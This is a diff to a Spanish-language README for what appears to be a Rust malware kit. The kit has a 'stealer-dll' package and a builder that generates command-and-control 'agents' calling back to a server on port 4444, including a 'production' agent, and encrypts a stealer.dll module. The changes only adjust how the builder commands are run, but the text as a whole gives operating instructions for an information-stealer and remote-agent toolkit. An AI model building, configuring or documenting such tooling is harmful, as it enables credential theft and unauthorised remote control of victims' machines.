@@ -45,25 +45,23 @@ cargo build --release --target x86_64-pc-windows-gnu --package stealer-dll
 
 ## 🚀 Uso
 
+**Nota**: Los comandos se pueden ejecutar desde el directorio raíz del proyecto o desde `builder/`.
+
 ### Generar Agent
 
 ```bash
-cd builder
-
-# Agent básico (localhost)
-cargo run -- build-agent --name test_agent --server 127.0.0.1:4444
+# Agent básico (localhost) - desde raíz del proyecto
+cargo run -p builder -- build-agent --name test_agent --server 127.0.0.1:4444
 
 # Agent para producción
-cargo run -- build-agent --name prod_agent --server 192.168.1.100:4444
+cargo run -p builder -- build-agent --name prod_agent --server 192.168.1.100:4444
 ```
 
 ### Generar Módulo Stealer
 
 ```bash
-cd builder
-
-# Encriptar stealer.dll
-cargo run -- encrypt-module
+# Encriptar stealer.dll (se puede ejecutar desde cualquier directorio)
+cargo run -p builder -- encrypt-module
 ```
 
 ## 📦 Archivos Generados
